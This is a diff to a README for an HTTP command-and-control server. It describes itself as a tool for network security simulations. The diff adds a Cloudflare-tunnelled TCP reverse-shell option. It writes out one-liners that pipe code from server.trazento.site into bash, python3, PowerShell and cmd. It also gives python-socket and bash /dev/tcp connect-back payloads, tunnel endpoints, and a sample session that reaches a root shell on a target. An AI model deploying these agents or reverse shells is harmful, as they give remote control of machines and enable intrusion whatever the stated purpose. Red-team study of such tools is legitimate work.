@@ -6,21 +6,29 @@ HTTP-based C2 server for network security simulations. Agents communicate via po
 
 ```
 [Target Machine]
-    ├── curl .../sh | bash   → agent.sh downloads agent.py
-    ├── curl .../py | python3 → agent.py runs directly
-    └── curl .../ps1          → PowerShell agent
-    │
-    ▼  beacon every 10s (GET /tasks/<id>?token=...)
-    ▼  execute tasks, POST results
-    │
-[Cloudflare Tunnel: server.trazento.site]
-    │
-    ▼  proxy all paths to localhost:8080
-    │
-[C2 Server: 0.0.0.0:8080]
-    ├── HTTP handler (REST API)
-    ├── Agent manager (state + task queue)
-    └── CLI menu (interactive control)
+
+  ┌─ HTTP Agent (polling, menu options 1-13)
+  │   curl .../sh | bash → agent.sh → downloads agent.py
+  │   curl .../py | python3 → agent.py (direct Python)
+  │   curl .../ps1 → PowerShell agent
+  │
+  ├─ TCP Reverse Shell (option 14)
+  │   python3 -c "import socket..." → connects back
+  │   bash -c 'exec 3<>/dev/tcp/...' → raw bash shell
+  │
+  ▼  HTTP: beacon every 2s (GET /tasks/<id>?token=...)
+  ▼  TCP: persistent connection via Cloudflare TCP tunnel
+  │
+[Cloudflare Tunnel]
+  ├─ HTTP: server.trazento.site → localhost:8080
+  └─ TCP:  t234c2rp.trazento.site:4444 → localhost:4444
+  │
+  ▼
+[C2 Server: 0.0.0.0:8080 + 0.0.0.0:4444]
+  ├── HTTP handler (REST API — agent polling, file serving)
+  ├── Agent manager (state + task queue)
+  ├── TCP listener (reverse shell — option 14)
+  └── CLI menu (interactive control)
 ```
 
 ## Quick Start
@@ -36,21 +44,36 @@ Server starts on `0.0.0.0:8080`. Auth token generated and displayed at startup.
 
 ## Deploy Agent
 
+### HTTP Agent (Polling)
+
 ```bash
-# Linux (via shell launcher)
+# Linux — shell launcher (downloads agent.py then runs)
 curl -s https://server.trazento.site/sh | bash
 
-# Linux (direct Python)
+# Linux — direct Python
 curl -s https://server.trazento.site/py | python3
 
-# Windows (PowerShell)
+# Windows PowerShell
 curl -s https://server.trazento.site/ps1 | powershell -c -
 
-# Windows (Batch)
+# Windows Batch
 curl -s https://server.trazento.site/bat | cmd
 ```
 
-Agent beacons every 10 seconds. Wait up to 30s for first check-in.
+Agent beacons every **2 seconds**. Use menu options 1-13 for command execution via HTTP polling.
+
+### TCP Reverse Shell
+
+```bash
+# C2 server (option 14) opens listener on port 4444
+# Agent connects via Cloudflare TCP tunnel:
+#   t234c2rp.trazento.site:4444 → Cloudflare → localhost:4444
+
+# Agent runs automatically — no manual curl needed.
+# Server sends embedded Python/bash reverse shell payload.
+```
+
+Requires Cloudflare TCP tunnel configured: `t234c2rp.trazento.site` → `tcp://localhost:4444`.
 
 ---
 
@@ -71,7 +94,7 @@ Agent beacons every 10 seconds. Wait up to 30s for first check-in.
 | 11 | **Agent results** | View task history for a specific agent. |
 | 12 | **View logs** | In-memory log buffer. Tail, follow, clear. |
 | 13 | **Show token** | Display current auth token and one-liner commands. |
-| 14 | **Reverse shell** | TCP reverse shell via bash `/dev/tcp`. Opens listener, agent connects back. Real PTY shell. |
+| 14 | **Reverse shell** | Real TCP reverse shell. Uses Cloudflare tunnel `t234c2rp.trazento.site:4444`. PTY bridge — full terminal. |
 | 0 | **Exit** | Stop server and quit. |
 
 ---
@@ -340,26 +363,29 @@ This project expects the tunnel already configured. The tunnel provides:
 
 ### 14. Reverse Shell (TCP)
 
-Real interactive TCP reverse shell using bash's `/dev/tcp`. Opens a random port on the C2 server, sends connect-back payload to agent, bridges the socket to a local PTY. Full terminal support — `su`, `ssh`, `nano`, `htop`, `vim` all work.
+Real interactive TCP reverse shell through Cloudflare tunnel. Uses `t234c2rp.trazento.site:4444` (→ Cloudflare → `localhost:4444`). Sends Python/bash connect-back payload to agent, bridges the socket to a local PTY via `pty.fork()`. Full terminal — `su`, `ssh`, `nano`, `vim`, `htop` all work.
 
 ```text
 C2> 14
 Agent ID: a1b2c3d4
-[*] Starting reverse shell listener on 0.0.0.0:34567
-[*] Agent will connect to 192.168.100.82:34567
-[*] Sending payload to agent...
-[+] Reverse shell received from ('192.168.100.79', 54321)
-[*] You now have a real shell. Type 'exit' to return.
+[*] Listener on 0.0.0.0:4444
+[*] Python shell → t234c2rp.trazento.site:4444
+[+] Reverse shell from ('100.100.103.107', 54321)
+[*] Real shell. Type 'exit' to return.
 
 root@target:~# whoami
 root
-root@target:~# cd /root
-root@target:~# ls
+root@target:~# cd /root && ls
 root@target:~# exit
 [+] Shell closed
 ```
 
-Uses `pty.fork()` for proper terminal emulation. Handles SIGWINCH for resize. Type `exit` to close.
+**Cloudflare prereq:** `t234c2rp.trazento.site` → `tcp://localhost:4444`
+
+- Handshake token validates real agent connection (ignores port scanners)
+- SIGWINCH handler for terminal resize
+- Tries Python reverse shell first, bash `/dev/tcp` fallback
+- 20s total timeout before giving up
 
 ## Limitations of Option 4 (HTTP Shell)
 
